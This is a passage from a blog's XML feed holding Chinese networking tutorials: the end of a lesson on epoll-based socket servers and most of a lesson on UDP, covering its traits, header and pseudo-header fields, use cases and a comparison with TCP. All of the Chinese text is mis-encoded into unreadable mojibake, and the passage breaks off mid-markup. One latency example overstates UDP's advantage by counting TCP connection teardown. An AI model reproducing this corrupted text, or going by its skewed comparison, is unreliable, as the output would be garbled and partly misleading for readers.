id="é‡ç‚¹å›é¡¾"><a href="#é‡ç‚¹å›é¡¾" class="headerlink" title="é‡ç‚¹å›é¡¾"></a>é‡ç‚¹å›é¡¾</h3><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">é«˜æ€§èƒ½ç½‘ç»œç¼–ç¨‹ </span>=<span class="hljs-string"> IOå¤šè·¯å¤ç”¨ + éé˜»å¡Socket</span><br><span class="hljs-string"></span><br><span class="hljs-string">Linuxæ¨èï¼š</span><br><span class="hljs-string">epoll + éé˜»å¡ + è¾¹ç¼˜è§¦å‘</span><br><span class="hljs-string"></span><br><span class="hljs-string">æ¶æ„é€‰æ‹©ï¼š</span><br><span class="hljs-string">IOå¯†é›† â†’ epollå•çº¿ç¨‹</span><br><span class="hljs-string">CPUå¯†é›† â†’ å¤šè¿›ç¨‹</span><br><span class="hljs-string">æ··åˆ â†’ epoll + çº¿ç¨‹æ± </span><br></code></pre></td></tr></table></figure><h3 id="æ˜å¤©é¢„å‘Š"><a href="#æ˜å¤©é¢„å‘Š" class="headerlink" title="æ˜å¤©é¢„å‘Š"></a>æ˜å¤©é¢„å‘Š</h3><p><strong>ç¬¬19å¤©ï¼šHTTPåè®®åŸºç¡€</strong></p><p>å†…å®¹é¢„è§ˆï¼š</p><ul><li>HTTPåè®®æ¦‚è¿°</li><li>HTTPè¯·æ±‚å’Œå“åº”æ ¼å¼</li><li>HTTPæ–¹æ³•è¯¦è§£</li><li>HTTPçŠ¶æ€ç </li><li>Cookieå’ŒSession</li><li>å®ç°ç®€å•çš„HTTPæœåŠ¡å™¨</li></ul><hr><p><strong>ç»§ç»­åŠ æ²¹ï¼</strong> ğŸš€</p><p>ä»Šå¤©æˆ‘ä»¬å­¦ä¹ äº†é«˜çº§Socketç¼–ç¨‹æŠ€æœ¯ï¼Œç†è§£äº†å¦‚ä½•æ„å»ºé«˜æ€§èƒ½æœåŠ¡å™¨ã€‚è¿™äº›çŸ¥è¯†æ˜¯ç°ä»£ç½‘ç»œç¼–ç¨‹çš„æ ¸å¿ƒï¼Œä¹Ÿæ˜¯å¾ˆå¤šWebæ¡†æ¶çš„åº•å±‚å®ç°åŸç†ã€‚æ˜å¤©æˆ‘ä»¬å°†å­¦ä¹ åº”ç”¨å±‚çš„HTTPåè®®ï¼</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>17å¤©ï¼šUDPåè®®è¯¦è§£</title>
    <link href="/2025/11/10/17%E5%A4%A9%EF%BC%9AUDP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/11/10/17%E5%A4%A9%EF%BC%9AUDP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬17å¤©ï¼šUDPåè®®è¯¦è§£"><a href="#ç¬¬17å¤©ï¼šUDPåè®®è¯¦è§£" class="headerlink" title="ç¬¬17å¤©ï¼šUDPåè®®è¯¦è§£"></a>ç¬¬17å¤©ï¼šUDPåè®®è¯¦è§£</h1><h2 id="ä»Šæ—¥ç›®æ ‡"><a href="#ä»Šæ—¥ç›®æ ‡" class="headerlink" title="ä»Šæ—¥ç›®æ ‡"></a>ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£UDPåè®®çš„ç‰¹ç‚¹å’Œå·¥ä½œåŸç†</li><li>æŒæ¡UDPæŠ¥æ–‡æ ¼å¼</li><li>æ·±å…¥å¯¹æ¯”UDPå’ŒTCPçš„åŒºåˆ«</li><li>äº†è§£UDPçš„åº”ç”¨åœºæ™¯</li><li>æŒæ¡UDPç¼–ç¨‹æŠ€å·§</li><li>å®ç°åŸºäºUDPçš„åº”ç”¨ç¨‹åº</li><li>äº†è§£å¦‚ä½•åœ¨UDPä¸Šå®ç°å¯é ä¼ è¾“</li></ul><hr><h2 id="1-UDPåè®®æ¦‚è¿°"><a href="#1-UDPåè®®æ¦‚è¿°" class="headerlink" title="1. UDPåè®®æ¦‚è¿°"></a>1. UDPåè®®æ¦‚è¿°</h2><h3 id="1-1-ä»€ä¹ˆæ˜¯UDPï¼Ÿ"><a href="#1-1-ä»€ä¹ˆæ˜¯UDPï¼Ÿ" class="headerlink" title="1.1 ä»€ä¹ˆæ˜¯UDPï¼Ÿ"></a>1.1 ä»€ä¹ˆæ˜¯UDPï¼Ÿ</h3><p><strong>UDPï¼ˆUser Datagram Protocolï¼Œç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼‰</strong> æ˜¯ä¸€ç§ç®€å•çš„ã€æ— è¿æ¥çš„ä¼ è¾“å±‚åè®®ã€‚</p><p><strong>ç”Ÿæ´»ç±»æ¯”</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs markdown">UDPå°±åƒå¯„æ˜ä¿¡ç‰‡ï¼š<br><span class="hljs-bullet">1.</span> å†™å¥½åœ°å€ç›´æ¥æŠ•é€’ï¼ˆæ— éœ€å»ºç«‹è¿æ¥ï¼‰<br><span class="hljs-bullet">2.</span> ä¸ä¿è¯ä¸€å®šé€è¾¾ï¼ˆå°½åŠ›è€Œä¸ºï¼‰<br><span class="hljs-bullet">3.</span> ä¸ä¿è¯æŒ‰é¡ºåºåˆ°è¾¾ï¼ˆå¯èƒ½ä¹±åºï¼‰<br><span class="hljs-bullet">4.</span> å¿«é€Ÿç®€å•ï¼ˆå¼€é”€å°ï¼‰<br><br>TCPå°±åƒæ‰“ç”µè¯ï¼š<br><span class="hljs-bullet">1.</span> å…ˆæ‹¨å·å»ºç«‹è¿æ¥<br><span class="hljs-bullet">2.</span> ä¿è¯å¯¹æ–¹å¬åˆ°ï¼ˆæœ‰ç¡®è®¤ï¼‰<br><span class="hljs-bullet">3.</span> æŒ‰é¡ºåºä¼ é€’ä¿¡æ¯<br><span class="hljs-bullet">4.</span> ç›¸å¯¹æ…¢ä¸€äº›ï¼ˆå¼€é”€å¤§ï¼‰<br></code></pre></td></tr></table></figure><h3 id="1-2-UDPçš„æ ¸å¿ƒç‰¹ç‚¹"><a href="#1-2-UDPçš„æ ¸å¿ƒç‰¹ç‚¹" class="headerlink" title="1.2 UDPçš„æ ¸å¿ƒç‰¹ç‚¹"></a>1.2 UDPçš„æ ¸å¿ƒç‰¹ç‚¹</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs markdown">UDP = ç®€å•ã€å¿«é€Ÿã€æ— è¿æ¥ã€ä¸å¯é <br><br>âœ… ä¼˜ç‚¹ï¼š<br><span class="hljs-bullet">1.</span> æ— è¿æ¥<br>   â””â”€ ä¸éœ€è¦ä¸‰æ¬¡æ¡æ‰‹å’Œå››æ¬¡æŒ¥æ‰‹<br>   â””â”€ å‡å°‘å»¶è¿Ÿ<br><br><span class="hljs-bullet">2.</span> å¼€é”€å°<br>   â””â”€ å¤´éƒ¨åªæœ‰8å­—èŠ‚ï¼ˆTCPæ˜¯20-60å­—èŠ‚ï¼‰<br>   â””â”€ æ— éœ€ç»´æŠ¤è¿æ¥çŠ¶æ€<br><br><span class="hljs-bullet">3.</span> é€Ÿåº¦å¿«<br>   â””â”€ æ— æµé‡æ§åˆ¶<br>   â””â”€ æ— æ‹¥å¡æ§åˆ¶<br>   â””â”€ å‘é€å³å¯<br><br><span class="hljs-bullet">4.</span> æ”¯æŒä¸€å¯¹å¤š<br>   â””â”€ æ”¯æŒå¹¿æ’­å’Œç»„æ’­<br>   â””â”€ ä¸€ä¸ªåŒ…å¯ä»¥å‘ç»™å¤šä¸ªæ¥æ”¶æ–¹<br><br><span class="hljs-bullet">5.</span> é¢å‘æ•°æ®æŠ¥<br>   â””â”€ ä¿ç•™æ¶ˆæ¯è¾¹ç•Œ<br>   â””â”€ åº”ç”¨å±‚å‘é€å¤šå°‘ï¼Œå°±ä¼ è¾“å¤šå°‘<br><br>âŒ ç¼ºç‚¹ï¼š<br><span class="hljs-bullet">1.</span> ä¸å¯é <br>   â””â”€ æ•°æ®å¯èƒ½ä¸¢å¤±<br>   â””â”€ æ•°æ®å¯èƒ½é‡å¤<br>   â””â”€ æ•°æ®å¯èƒ½ä¹±åº<br><br><span class="hljs-bullet">2.</span> æ— æµé‡æ§åˆ¶<br>   â””â”€ å¯èƒ½æ·¹æ²¡æ¥æ”¶æ–¹<br><br><span class="hljs-bullet">3.</span> æ— æ‹¥å¡æ§åˆ¶<br>   â””â”€ å¯èƒ½é€ æˆç½‘ç»œæ‹¥å¡<br><br><span class="hljs-bullet">4.</span> æ— è¿æ¥çŠ¶æ€<br>   â””â”€ åº”ç”¨å±‚éœ€è¦è‡ªå·±ç®¡ç†<br></code></pre></td></tr></table></figure><h3 id="1-3-UDPé€‚ç”¨åœºæ™¯"><a href="#1-3-UDPé€‚ç”¨åœºæ™¯" class="headerlink" title="1.3 UDPé€‚ç”¨åœºæ™¯"></a>1.3 UDPé€‚ç”¨åœºæ™¯</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs markdown">é€‚åˆä½¿ç”¨UDPçš„åœºæ™¯ï¼š<br><br><span class="hljs-bullet">1.</span> å®æ—¶æ€§è¦æ±‚é«˜<br>   â”œâ”€ è§†é¢‘ç›´æ’­<br>   â”œâ”€ è¯­éŸ³é€šè¯ï¼ˆVoIPï¼‰<br>   â”œâ”€ ç½‘ç»œæ¸¸æˆ<br>   â””â”€ è§†é¢‘ä¼šè®®<br><br><span class="hljs-bullet">2.</span> å¯ä»¥å®¹å¿å°‘é‡ä¸¢åŒ…<br>   â”œâ”€ æµåª’ä½“ï¼ˆè·³è¿‡ä¸¢å¤±çš„å¸§ï¼‰<br>   â””â”€ ä¼ æ„Ÿå™¨æ•°æ®ï¼ˆä¸‹ä¸€æ¬¡æ›´æ–°ä¼šè¦†ç›–ï¼‰<br><br><span class="hljs-bullet">3.</span> ç®€å•çš„è¯·æ±‚-åº”ç­”<br>   â”œâ”€ DNSæŸ¥è¯¢<br>   â””â”€ DHCP<br><br><span class="hljs-bullet">4.</span> å¹¿æ’­/ç»„æ’­åº”ç”¨<br>   â”œâ”€ ç½‘ç»œå‘ç°<br>   â”œâ”€ æœåŠ¡é€šå‘Š<br>   â””â”€ å¤šæ’­è§†é¢‘<br><br><span class="hljs-bullet">5.</span> æ•°æ®é‡å°<br>   â”œâ”€ å•ä¸ªè¯·æ±‚-å“åº”å¯ä»¥æ”¾åœ¨ä¸€ä¸ªUDPåŒ…ä¸­<br>   â””â”€ å¦‚DNSæŸ¥è¯¢<br><br>ä¸é€‚åˆUDPçš„åœºæ™¯ï¼š<br>âŒ æ–‡ä»¶ä¼ è¾“ï¼ˆéœ€è¦å¯é æ€§ï¼‰<br>âŒ é‚®ä»¶å‘é€ï¼ˆä¸èƒ½ä¸¢å¤±ï¼‰<br>âŒ ç½‘é¡µæµè§ˆï¼ˆéœ€è¦å®Œæ•´å†…å®¹ï¼‰<br>âŒ æ•°æ®åº“æŸ¥è¯¢ï¼ˆéœ€è¦å‡†ç¡®ç»“æœï¼‰<br></code></pre></td></tr></table></figure><hr><h2 id="2-UDPæŠ¥æ–‡æ ¼å¼"><a href="#2-UDPæŠ¥æ–‡æ ¼å¼" class="headerlink" title="2. UDPæŠ¥æ–‡æ ¼å¼"></a>2. UDPæŠ¥æ–‡æ ¼å¼</h2><h3 id="2-1-UDPæ•°æ®æŠ¥ç»“æ„"><a href="#2-1-UDPæ•°æ®æŠ¥ç»“æ„" class="headerlink" title="2.1 UDPæ•°æ®æŠ¥ç»“æ„"></a>2.1 UDPæ•°æ®æŠ¥ç»“æ„</h3><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">UDPæ•°æ®æŠ¥ </span>=<span class="hljs-string"> UDPå¤´éƒ¨ + åº”ç”¨æ•°æ®</span><br><span class="hljs-string"></span><br><span class="hljs-string">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="hljs-string">â”‚       UDP å¤´éƒ¨ (8 å­—èŠ‚)              â”‚</span><br><span class="hljs-string">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span><br><span class="hljs-string">â”‚       åº”ç”¨æ•°æ® (å¯å˜é•¿åº¦)             â”‚</span><br><span class="hljs-string">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br></code></pre></td></tr></table></figure><h3 id="2-2-UDPå¤´éƒ¨æ ¼å¼"><a href="#2-2-UDPå¤´éƒ¨æ ¼å¼" class="headerlink" title="2.2 UDPå¤´éƒ¨æ ¼å¼"></a>2.2 UDPå¤´éƒ¨æ ¼å¼</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code"> 0                   1                   2                   3</span><br><span class="hljs-section"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|          æºç«¯å£ (16ä½)         |        ç›®æ ‡ç«¯å£ (16ä½)         |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|         é•¿åº¦ (16ä½)            |        æ ¡éªŒå’Œ (16ä½)           |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br>|                                                                |<br>|                          æ•°æ®                                  |<br><span class="hljs-section">|                                                                |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><br>æ€»å…±åªæœ‰4ä¸ªå­—æ®µï¼Œæ¯ä¸ª16ä½ï¼ˆ2å­—èŠ‚ï¼‰<br></code></pre></td></tr></table></figure><h3 id="2-3-å­—æ®µè¯¦è§£"><a href="#2-3-å­—æ®µè¯¦è§£" class="headerlink" title="2.3 å­—æ®µè¯¦è§£"></a>2.3 å­—æ®µè¯¦è§£</h3><p><strong>1. æºç«¯å£ï¼ˆSource Portï¼Œ16ä½ï¼‰</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">ä½œç”¨ï¼šæ ‡è¯†å‘é€æ–¹åº”ç”¨è¿›ç¨‹<br>èŒƒå›´ï¼š0 ~ 65535<br>å¯é€‰ï¼šå¯ä»¥è®¾ç½®ä¸º0ï¼ˆä¸éœ€è¦å›å¤æ—¶ï¼‰<br><br>ç¤ºä¾‹ï¼š<br>å®¢æˆ·ç«¯éšæœºç«¯å£ï¼š54321<br></code></pre></td></tr></table></figure><p><strong>2. ç›®æ ‡ç«¯å£ï¼ˆDestination Portï¼Œ16ä½ï¼‰</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">ä½œç”¨ï¼šæ ‡è¯†æ¥æ”¶æ–¹åº”ç”¨è¿›ç¨‹<br>èŒƒå›´ï¼š0 ~ 65535<br>å¿…é¡»ï¼šæ€»æ˜¯éœ€è¦æŒ‡å®š<br><br>ç¤ºä¾‹ï¼š<br>DNSæœåŠ¡å™¨ç«¯å£ï¼š53<br></code></pre></td></tr></table></figure><p><strong>3. é•¿åº¦ï¼ˆLengthï¼Œ16ä½ï¼‰</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tap">ä½œç”¨ï¼šUDPæ•°æ®æŠ¥çš„æ€»é•¿åº¦ï¼ˆå¤´éƒ¨+æ•°æ®ï¼‰<br>å•ä½ï¼šå­—èŠ‚<br>èŒƒå›´ï¼š8 ~ 65535<br>æœ€å°å€¼ï¼š8ï¼ˆåªæœ‰å¤´éƒ¨ï¼Œæ— æ•°æ®ï¼‰<br><br>è®¡ç®—ï¼š<br>é•¿åº¦ = UDPå¤´éƒ¨(8å­—èŠ‚) + æ•°æ®é•¿åº¦<br><br>ç¤ºä¾‹ï¼š<br>å‘é€ &quot;HELLO&quot; (5å­—èŠ‚)<br>é•¿åº¦ =<span class="hljs-number"> 8 </span>+<span class="hljs-number"> 5 </span>=<span class="hljs-number"> 13 </span>å­—èŠ‚<br></code></pre></td></tr></table></figure><p><strong>4. æ ¡éªŒå’Œï¼ˆChecksumï¼Œ16ä½ï¼‰</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ä½œç”¨ï¼šæ£€æµ‹UDPæ•°æ®æŠ¥åœ¨ä¼ è¾“ä¸­æ˜¯å¦å‡ºé”™<br>èŒƒå›´ï¼š0 ~ 65535<br>å¯é€‰ï¼šIPv4ä¸­å¯ä»¥ä¸ä½¿ç”¨ï¼ˆè®¾ç½®ä¸º0ï¼‰<br>å¿…é¡»ï¼šIPv6ä¸­å¿…é¡»ä½¿ç”¨<br><br>æ ¡éªŒèŒƒå›´ï¼š<br><span class="hljs-bullet">- </span>UDPä¼ªå¤´éƒ¨ï¼ˆæ¥è‡ªIPå±‚ï¼‰<br><span class="hljs-bullet">- </span>UDPå¤´éƒ¨<br><span class="hljs-bullet">- </span>UDPæ•°æ®<br><br>å¦‚æœæ ¡éªŒå¤±è´¥ â†’ ä¸¢å¼ƒè¯¥æ•°æ®æŠ¥<br></code></pre></td></tr></table></figure><h3 id="2-4-UDPä¼ªå¤´éƒ¨"><a href="#2-4-UDPä¼ªå¤´éƒ¨" class="headerlink" title="2.4 UDPä¼ªå¤´éƒ¨"></a>2.4 UDPä¼ªå¤´éƒ¨</h3><p><strong>ä¸ºä»€ä¹ˆéœ€è¦ä¼ªå¤´éƒ¨ï¼Ÿ</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs armasm">é—®é¢˜ï¼š<br><span class="hljs-symbol">UDP</span>æ ¡éªŒå’Œåªæ ¡éªŒUDPæ®µæœ¬èº«<br>å¦‚æœ<span class="hljs-built_in">IP</span>å¤´éƒ¨çš„æºåœ°å€æˆ–ç›®æ ‡åœ°å€è¢«ç¯¡æ”¹<br><span class="hljs-symbol">UDP</span>æ— æ³•æ£€æµ‹åˆ°<br><br>è§£å†³ï¼š<br><span class="hljs-symbol">UDP</span>æ ¡éªŒå’ŒåŒ…å«<span class="hljs-built_in">IP</span>å±‚çš„éƒ¨åˆ†ä¿¡æ¯ï¼ˆä¼ªå¤´éƒ¨ï¼‰<br></code></pre></td></tr></table></figure><p><strong>ä¼ªå¤´éƒ¨ç»“æ„ï¼ˆIPv4ï¼‰</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code"> 0                   1                   2                   3</span><br><span class="hljs-section"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                        æºIPåœ°å€ (32ä½)                         |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                       ç›®æ ‡IPåœ°å€ (32ä½)                        |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|    é›¶ (8ä½)    | åè®® (8ä½)    |        UDPé•¿åº¦ (16ä½)          |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><br>é›¶ï¼šå¡«å……å­—èŠ‚ï¼Œå€¼ä¸º0<br>åè®®ï¼š17ï¼ˆUDPçš„åè®®å·ï¼‰<br>UDPé•¿åº¦ï¼šUDPå¤´éƒ¨+æ•°æ®çš„é•¿åº¦<br><br>æ³¨æ„ï¼šä¼ªå¤´éƒ¨åªç”¨äºæ ¡éªŒå’Œè®¡ç®—ï¼Œä¸å®é™…ä¼ è¾“<br></code></pre></td></tr></table></figure><hr><h2 id="3-UDP-vs-TCP-æ·±å…¥å¯¹æ¯”"><a href="#3-UDP-vs-TCP-æ·±å…¥å¯¹æ¯”" class="headerlink" title="3. UDP vs TCP æ·±å…¥å¯¹æ¯”"></a>3. UDP vs TCP æ·±å…¥å¯¹æ¯”</h2><h3 id="3-1-è¯¦ç»†å¯¹æ¯”è¡¨"><a href="#3-1-è¯¦ç»†å¯¹æ¯”è¡¨" class="headerlink" title="3.1 è¯¦ç»†å¯¹æ¯”è¡¨"></a>3.1 è¯¦ç»†å¯¹æ¯”è¡¨</h3><table><thead><tr><th>ç‰¹æ€§</th><th>UDP</th><th>TCP</th></tr></thead><tbody><tr><td><strong>è¿æ¥</strong></td><td>æ— è¿æ¥</td><td>é¢å‘è¿æ¥ï¼ˆä¸‰æ¬¡æ¡æ‰‹&#x2F;å››æ¬¡æŒ¥æ‰‹ï¼‰</td></tr><tr><td><strong>å¯é æ€§</strong></td><td>ä¸å¯é ï¼ˆå°½åŠ›è€Œä¸ºï¼‰</td><td>å¯é ï¼ˆç¡®è®¤+é‡ä¼ ï¼‰</td></tr><tr><td><strong>é¡ºåº</strong></td><td>ä¸ä¿è¯é¡ºåº</td><td>ä¿è¯é¡ºåº</td></tr><tr><td><strong>æµé‡æ§åˆ¶</strong></td><td>æ— </td><td>æœ‰ï¼ˆæ»‘åŠ¨çª—å£ï¼‰</td></tr><tr><td><strong>æ‹¥å¡æ§åˆ¶</strong></td><td>æ— </td><td>æœ‰ï¼ˆæ…¢å¯åŠ¨ã€æ‹¥å¡é¿å…ï¼‰</td></tr><tr><td><strong>å¤´éƒ¨å¼€é”€</strong></td><td>8å­—èŠ‚</td><td>20-60å­—èŠ‚</td></tr><tr><td><strong>é€Ÿåº¦</strong></td><td>å¿«</td><td>ç›¸å¯¹æ…¢</td></tr><tr><td><strong>æ•°æ®è¾¹ç•Œ</strong></td><td>ä¿ç•™ï¼ˆæ•°æ®æŠ¥ï¼‰</td><td>ä¸ä¿ç•™ï¼ˆå­—èŠ‚æµï¼‰</td></tr><tr><td><strong>å¹¿æ’­&#x2F;ç»„æ’­</strong></td><td>æ”¯æŒ</td><td>ä¸æ”¯æŒ</td></tr><tr><td><strong>è¿æ¥æ•°</strong></td><td>æ— é™åˆ¶</td><td>å—ç³»ç»Ÿèµ„æºé™åˆ¶</td></tr><tr><td><strong>åº”ç”¨åœºæ™¯</strong></td><td>å®æ—¶ã€ç®€å•è¯·æ±‚</td><td>å¯é ä¼ è¾“</td></tr></tbody></table><h3 id="3-2-æ€§èƒ½å¯¹æ¯”"><a href="#3-2-æ€§èƒ½å¯¹æ¯”" class="headerlink" title="3.2 æ€§èƒ½å¯¹æ¯”"></a>3.2 æ€§èƒ½å¯¹æ¯”</h3><p><strong>å»¶è¿Ÿå¯¹æ¯”</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">TCPé¦–æ¬¡é€šä¿¡ï¼š<br><span class="hljs-bullet">1.</span> ä¸‰æ¬¡æ¡æ‰‹ï¼š1.5 RTT<br><span class="hljs-bullet">2.</span> æ•°æ®ä¼ è¾“ï¼š1 RTT<br><span class="hljs-bullet">3.</span> å››æ¬¡æŒ¥æ‰‹ï¼š2 RTT<br>æ€»å»¶è¿Ÿï¼š4.5 RTT<br><br>UDPé¦–æ¬¡é€šä¿¡ï¼š<br><span class="hljs-bullet">1.</span> ç›´æ¥å‘é€æ•°æ®ï¼š1 RTT<br>æ€»å»¶è¿Ÿï¼š1 RTT<br><br>ç¤ºä¾‹ï¼ˆRTT=50msï¼‰ï¼š<br>TCPé¦–æ¬¡è¯·æ±‚ï¼š225ms<br>UDPé¦–æ¬¡è¯·æ±‚ï¼š50ms<br>UDPå¿« 4.5 å€ï¼<br></code></pre></td></tr></table></figure><p><strong>ååé‡å¯¹æ¯”</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ç›¸åŒå¸¦å®½ä¸‹ï¼š<br>UDPï¼š<br><span class="hljs-bullet">- </span>æ— æµé‡æ§åˆ¶<br><span class="hljs-bullet">- </span>æ— æ‹¥å¡æ§åˆ¶<br><span 